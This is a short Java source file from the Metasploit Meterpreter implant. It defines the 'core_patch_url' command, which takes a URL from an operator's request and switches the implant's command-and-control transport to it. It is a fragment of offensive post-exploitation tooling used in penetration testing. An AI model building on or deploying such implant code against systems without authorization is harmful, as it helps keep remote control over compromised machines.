package com.metasploit.meterpreter.core;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class core_patch_url implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String patchUrl = request.getStringValue(TLVType.TLV_TYPE_TRANS_URL);
        if (meterpreter.getTransports().current().switchUri(patchUrl)) {
            return EXIT_DISPATCH;
        } else {
            return ERROR_FAILURE;
        }
    }
}
